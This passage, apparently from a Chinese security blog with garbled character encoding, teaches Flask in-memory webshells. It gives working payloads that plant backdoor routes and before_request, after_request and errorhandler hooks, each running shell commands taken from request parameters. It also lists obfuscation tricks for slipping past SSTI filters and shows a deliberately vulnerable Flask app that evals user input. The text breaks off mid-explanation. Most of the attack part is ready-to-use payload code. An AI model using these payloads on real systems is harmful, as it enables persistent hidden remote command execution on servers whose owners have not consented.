<p>sys.modulesæ˜¯ä¸€ä¸ªå…¨å±€å­—å…¸ï¼Œè¯¥å­—å…¸æ˜¯pythonå¯åŠ¨åå°±åŠ è½½åœ¨å†…å­˜ä¸­ã€‚æ¯å½“ç¨‹åºå‘˜å¯¼å…¥æ–°çš„æ¨¡å—ï¼Œsys.moduleséƒ½å°†è®°å½•è¿™äº›æ¨¡å—ã€‚å­—å…¸sys.moduleså¯¹äºåŠ è½½æ¨¡å—èµ·åˆ°äº†ç¼“å†²çš„ä½œç”¨ã€‚å½“æŸä¸ªæ¨¡å—ç¬¬ä¸€æ¬¡å¯¼å…¥ï¼Œå­—å…¸sys.moduleså°†è‡ªåŠ¨è®°å½•è¯¥æ¨¡å—ã€‚å½“ç¬¬äºŒæ¬¡å†å¯¼å…¥è¯¥æ¨¡å—æ—¶ï¼Œpythonä¼šç›´æ¥åˆ°å­—å…¸ä¸­æŸ¥æ‰¾ï¼Œä»è€ŒåŠ å¿«äº†ç¨‹åºè¿è¡Œçš„é€Ÿåº¦ã€‚</p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡sys.modulesæ‹¿åˆ°å½“å‰å·²ç»å¯¼å…¥çš„æ¨¡å—ï¼Œå¹¶ä¸”è·å–æ¨¡å—ä¸­çš„å±æ€§ï¼Œç”±äºæˆ‘ä»¬æœ€ç»ˆçš„evalæ˜¯åœ¨app.pyä¸­æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>sys.modules['__main__']</code>æ¥è·å–å½“å‰çš„æ¨¡å—</p>
<p>æˆ‘ä»¬éœ€è¦åœ¨édebugæ¨¡å¼ä¸‹æ‰èƒ½æˆåŠŸæ·»åŠ åé—¨è·¯ç”±</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">debug</span><span class="o">=</span><span class="kc">False</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">add_url_rule</span><span class="p">(</span><span class="s1">&#39;/shell&#39;</span><span class="p">,</span><span class="s1">&#39;shell&#39;</span><span class="p">,</span><span class="k">lambda</span> <span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="bypassæ–¹æ³•">bypassæ–¹æ³•
</h3><ul>
<li><code>url_for</code>å¯æ›¿æ¢ä¸º<code>get_flashed_messages</code>æˆ–è€…<code>request.__init__</code>æˆ–è€…<code>request.application</code>.</li>
<li>ä»£ç æ‰§è¡Œå‡½æ•°æ›¿æ¢, å¦‚<code>exec</code>ç­‰æ›¿æ¢<code>eval</code>.</li>
<li>å­—ç¬¦ä¸²å¯é‡‡ç”¨æ‹¼æ¥æ–¹å¼, å¦‚<code>['__builtins__']['eval']</code>å˜ä¸º<code>['__bui'+'ltins__']['ev'+'al']</code>.</li>
<li><code>__globals__</code>å¯ç”¨<code>__getattribute__('__globa'+'ls__')</code>æ›¿æ¢.</li>
<li><code>[]</code>å¯ç”¨<code>.__getitem__()</code>æˆ–<code>.pop()</code>æ›¿æ¢.</li>
<li>è¿‡æ»¤<code>{{</code>æˆ–è€…<code>}}</code>, å¯ä»¥ä½¿ç”¨<code>{%</code>æˆ–è€…<code>%}</code>ç»•è¿‡, <code>{%%}</code>ä¸­é—´å¯ä»¥æ‰§è¡Œ<code>if</code>è¯­å¥, åˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥è¿›è¡Œç±»ä¼¼ç›²æ³¨çš„æ“ä½œæˆ–è€…å¤–å¸¦ä»£ç æ‰§è¡Œç»“æœ.</li>
<li>è¿‡æ»¤<code>_</code>å¯ä»¥ç”¨ç¼–ç ç»•è¿‡, å¦‚<code>__class__</code>æ›¿æ¢æˆ<code>\x5f\x5fclass\x5f\x5f</code>, è¿˜å¯ä»¥ç”¨<code>dir(0)[0][0]</code>æˆ–è€…<code>request['args']</code>æˆ–è€…<code>request['values']</code>ç»•è¿‡.</li>
<li>è¿‡æ»¤äº†<code>.</code>å¯ä»¥é‡‡ç”¨<code>attr()</code>æˆ–<code>[]</code>ç»•è¿‡.</li>
<li>å…¶å®ƒçš„æ‰‹æ³•å‚è€ƒ<code>SSTI</code>ç»•è¿‡è¿‡æ»¤çš„æ–¹æ³•å³å¯</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">å˜å½¢</span><span class="n">payload</span>
</span></span><span class="line"><span class="cl"><span class="n">request</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="n">__self__</span><span class="o">.</span><span class="n">_get_data_for_json</span><span class="o">.</span><span class="n">__getattribute__</span><span class="p">(</span><span class="s1">&#39;__globa&#39;</span><span class="o">+</span><span class="s1">&#39;ls__&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">__getitem__</span><span class="p">(</span><span class="s1">&#39;__bui&#39;</span><span class="o">+</span><span class="s1">&#39;ltins__&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">__getitem__</span><span class="p">(</span><span class="s1">&#39;ex&#39;</span><span class="o">+</span><span class="s1">&#39;ec&#39;</span><span class="p">)(</span><span class="s2">&#34;app.add_url_rule(&#39;/h3rmesk1t&#39;, &#39;h3rmesk1t&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;shell&#39;, &#39;calc&#39;)).read())&#34;</span><span class="p">,{</span><span class="s1">&#39;_request_ct&#39;</span><span class="o">+</span><span class="s1">&#39;x_stack&#39;</span><span class="p">:</span><span class="n">get_flashed_messages</span><span class="o">.</span><span class="n">__getattribute__</span><span class="p">(</span><span class="s1">&#39;__globa&#39;</span><span class="o">+</span><span class="s1">&#39;ls__&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;_request_&#39;</span><span class="o">+</span><span class="s1">&#39;ctx_stack&#39;</span><span class="p">),</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">get_flashed_messages</span><span class="o">.</span><span class="n">__getattribute__</span><span class="p">(</span><span class="s1">&#39;__globa&#39;</span><span class="o">+</span><span class="s1">&#39;ls__&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;curre&#39;</span><span class="o">+</span><span class="s1">&#39;nt_app&#39;</span><span class="p">)})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get_flashed_messages</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">globals</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getitem</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getitem</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\u0065\u0076\u0061\u006c</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;app.add_ur&#34;</span><span class="o">+</span><span class="s2">&#34;l_rule(&#39;/h3rmesk1t&#39;, &#39;h3rmesk1t&#39;, la&#34;</span><span class="o">+</span><span class="s2">&#34;mbda :__imp&#34;</span><span class="o">+</span><span class="s2">&#34;ort__(&#39;o&#34;</span><span class="o">+</span><span class="s2">&#34;s&#39;).po&#34;</span><span class="o">+</span><span class="s2">&#34;pen(_request_c&#34;</span><span class="o">+</span><span class="s2">&#34;tx_stack.to&#34;</span><span class="o">+</span><span class="s2">&#34;p.re&#34;</span><span class="o">+</span><span class="s2">&#34;quest.args.get(&#39;shell&#39;)).re&#34;</span><span class="o">+</span><span class="s2">&#34;ad())&#34;</span><span class="p">,{</span><span class="s1">&#39;</span><span class="se">\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b</span><span class="s1">&#39;</span><span class="p">:</span><span class="n">get_flashed_messages</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">globals</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getitem</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b</span><span class="s2">&#34;</span><span class="p">),</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">get_flashed_messages</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">globals</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getitem</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070</span><span class="s2">&#34;</span><span class="p">)})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="æ–°ç‰ˆflaskå†…å­˜é©¬">æ–°ç‰ˆflaskå†…å­˜é©¬
</h2><p>å‚è€ƒï¼š<a class="link" href="https://www.cnblogs.com/gxngxngxn/p/18181936"  target="_blank" rel="noopener"
    >æ–°ç‰ˆFLASKä¸‹pythonå†…å­˜é©¬çš„ç ”ç©¶ - gxngxngxn - åšå®¢å›­</a></p>
<p>åœ¨æœ€æ–°ç‰ˆæœ¬çš„Flaskä¸­ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨è¿™ä¸ªpayloadä¼šå‘ç°å°†æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚</p>
<p>ä½†æ˜¯å¯ä»¥åˆ©ç”¨<code>@app.before_request</code> <code>@app.after_request</code>æ–¹æ³•æ¥æ‰“</p>
<h3 id="before_request">before_request
</h3><p>æˆ‘ä»¬æ¯æ¬¡å‘èµ·è¯·æ±‚ä¹‹å‰ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè§¦å‘é‡Œé¢å®šä¹‰çš„å‡½æ•°</p>
<p>é‡Œé¢è°ƒç”¨äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">before_request_funcs</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="p">[])</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åfå°±æ˜¯è®¿é—®å€¼ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰çš„ï¼Œé‚£ä¹ˆè¿™é‡Œåªè¦æˆ‘ä»¬è®¾ç½®fä¸ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œç±»ä¼¼ä¹‹å‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">lambda</span> <span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="s2">&#34;__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#39;os&#39;).popen(&#39;dir&#39;).read())&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="after_request">after_request
</h3><p>è¿™ä¸ªæ˜¯åœ¨è¯·æ±‚å®Œæˆåè°ƒç”¨ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªæ˜¯éœ€è¦å®šä¹‰ä¸€ä¸ªè¿”å›å€¼çš„ï¼Œä¸ç„¶å°±æŠ¥é”™ã€‚</p>
<p>å‚è€ƒè¿™ä¸ªï¼š<a class="link" href="https://xz.aliyun.com/news/13858"  target="_blank" rel="noopener"
    >Python Flaskå†…å­˜é©¬çš„å¦è¾Ÿé€”å¾„-å…ˆçŸ¥ç¤¾åŒº</a></p>
<p><code>self.after_request_funcs.setdefault(None, []).append(f)</code>ä¼ å…¥çš„få°±æ˜¯å¯¹åº”çš„è‡ªå®šä¹‰å‡½æ•°ï¼Œä½†è¿™é‡Œçš„féœ€è¦æ¥æ”¶ä¸€ä¸ªresponseå¯¹è±¡ï¼ŒåŒæ—¶è¿”å›ä¸€ä¸ªresponseå¯¹è±¡ã€‚</p>
<p>ä½†æˆ‘ä»¬ä»…é€šè¿‡lambaæ— æ³•å¯¹åŸå§‹ä¼ è¿›æ¥çš„responseè¿›è¡Œä¿®æ”¹åå†è¿”å›ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°ç”Ÿæˆä¸€ä¸ªresponseå¯¹è±¡ï¼Œç„¶åå†è¿”å›è¿™ä¸ªresponseã€‚</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="s2">&#34;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(</span><span class="se">\&#34;</span><span class="s2">global CmdResp;CmdResp=__import__(</span><span class="se">\&#39;</span><span class="s2">flask</span><span class="se">\&#39;</span><span class="s2">).make_response(__import__(</span><span class="se">\&#39;</span><span class="s2">os</span><span class="se">\&#39;</span><span class="s2">).popen(request.args.get(</span><span class="se">\&#39;</span><span class="s2">cmd</span><span class="se">\&#39;</span><span class="s2">)).read())</span><span class="se">\&#34;</span><span class="s2">)==None else resp)&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿˜æ‰¾åˆ°äº†å…¶ä»–é’©å­å‡½æ•°</p>
<h3 id="errorhandler">errorhandler
</h3><p>è¿™ä¸ªå‡½æ•°å¯ä»¥ç”¨äºè‡ªå®šä¹‰404é¡µé¢çš„å›æ˜¾</p>
<p>è·Ÿè¿›register_error_handlerå‡½æ•°,</p>
<p><img src="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250416215450046.png"
	width="1426"
	height="134"
	srcset="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250416215450046_hu14993857377928626853.png 480w, /p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250416215450046_hu14094793102838107899.png 1024w"
	loading="lazy"
	
		alt="image-20250416215450046"
	
	
		class="gallery-image" 
		data-flex-grow="1064"
		data-flex-basis="2554px"
	
></p>
<p>code_or_exceptionå’Œfå°±æ˜¯ä¹‹å‰çš„é‚£ä¸¤ä¸ªå‚æ•°ï¼Œå¦‚æœæˆ‘ä»¬ç»•è¿‡ä¸Šé¢çš„register_error_handlerå‡½æ•°ï¼Œå¯¹è¿™é‡Œçš„å‡½æ•°è¿›è¡Œæ§åˆ¶ï¼Œä¸€æ ·å¯ä»¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚</p>
<p>è€Œ<strong>code</strong>å’Œ<strong>f</strong>æ˜¯æˆ‘ä»¬æ¯”è¾ƒæ–¹ä¾¿å¯ä»¥æ‰‹åŠ¨æ„é€ çš„ï¼Œä½†æ˜¯<strong>exc_class</strong>ä¸å¤ªå¥½æˆ‘ä»¬è‡ªå·±æ„é€ ï¼Œæˆ‘ä»¬çœ‹åˆ°è¿™ä¸¤ä¸ªå˜é‡æ˜¯é€šè¿‡<code>_get_exc_class_and_code</code>å‡½æ•°è·å–çš„ï¼Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°<strong>code_or_exception</strong>å°±æ˜¯æˆ‘ä»¬ä¹‹å‰ä¼ çš„404ï¼Œé‚£æˆ‘ä»¬å°±ä¾é è¿™ä¸ªæ¥è·å–å˜é‡å€¼ï¼Œç„¶åè¦†å†™å›¾ä¸­è¿™ä¸¤ä¸ªå‡½æ•°å³å¯</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="s2">&#34;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;gxngxngxn&#39;)).read()&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‰é¢æåˆ°æ–°ç‰ˆæ²¡åŠæ³•ç”¨è€ç‰ˆçš„payloadæ˜¯ä¼šæŠ›å‡ºé”™è¯¯</p>
<h3 id="è¿˜æ˜¯åˆ©ç”¨add_url_rule">è¿˜æ˜¯åˆ©ç”¨add_url_rule
</h3><p>å›å¤´çœ‹add_url_ruleå‡½æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rule_obj</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url_rule_class</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="n">methods</span><span class="p">,</span> <span class="o">**</span><span class="n">options</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rule_obj</span><span class="o">.</span><span class="n">provide_automatic_options</span> <span class="o">=</span> <span class="n">provide_automatic_options</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">url_map</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">rule_obj</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">view_func</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">old_func</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">view_functions</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">old_func</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">old_func</span> <span class="o">!=</span> <span class="n">view_func</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">AssertionError</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;View function mapping is overwriting an existing&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34; endpoint function: </span><span class="si">{</span><span class="n">endpoint</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">view_functions</span><span class="p">[</span><span class="n">endpoint</span><span class="p">]</span> <span class="o">=</span> <span class="n">view_func</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°åœ¨å‡½æ•°æœ«å°¾çš„å¤„ç†ä¸­ï¼Œå°† <code>rule_obj</code> å¯¹è±¡æ·»åŠ åˆ°äº† <code>url_map</code> ä¸­ï¼Œä¹‹åå°† <code>view_func</code> ä½œä¸ºäº† <code>view_functions</code> å­—å…¸ä¸­ <code>endpoint</code> é”®çš„å€¼ï¼Œæ‰€ä»¥ç†è®ºä¸Šæ¥è®²ï¼Œå¯ä»¥é€šè¿‡ç›´æ¥æ“ä½œè¿™ä¸¤ä¸ªå˜é‡æ¥å®Œæˆä¸€æ¬¡æ‰‹åŠ¨çš„ <code>add_url_rule</code></p>
<p><code>url_map</code> å’Œ <code>view_functions</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">url_map_class</span> <span class="o">=</span> <span class="n">Map</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">view_functions</span><span class="p">:</span> <span class="nb">dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">ft</span><span class="o">.</span><span class="n">RouteCallable</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">url_map</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url_map_class</span><span class="p">(</span><span class="n">host_matching</span><span class="o">=</span><span class="n">host_matching</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¼æ´ç¯å¢ƒ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">calc</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;expression&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;&lt;h2&gt;result: </span><span class="si">%s</span><span class="s1">!&lt;/h2&gt;&#39;</span> <span class="o">%</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">template</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨ <code>eval</code> åœºæ™¯ä¸‹ï¼Œæ²¡æœ‰åŠæ³•æ‰§è¡Œå¤šæ¡ä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å‘é€ä¸¤æ¡è¯·æ±‚æ¥å®Œæˆæ“ä½œï¼Œå½“å‰ä¸Šä¸‹æ–‡ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>app</code> å¯¹è±¡ï¼Œæ„é€ ç¬¬ä¸€æ¡è¯·æ±‚å‘ <code>url_map</code> ä¸­æ–°å¢ä¸€æ¡ <code>UrlRule</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">url_map</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">url_rule_class</span><span class="p">(</span><span class="s1">&#39;/flask-shell&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">],</span><span class="n">endpoint</span><span class="o">=</span><span class="s1">&#39;shell&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸ªæ—¶å€™å·²ç»å¯ä»¥è®¿é—® <code>/flask-shell</code> è·¯ç”±ï¼Œä½†æ˜¯ç”±äº <code>view_functions</code> ä¸­å¹¶ä¸å­˜åœ¨è·¯ç”±æŒ‡å®šçš„ <code>endpoint</code> æ‰€ä»¥ä¼šæŠ¥é”™ã€‚</p>
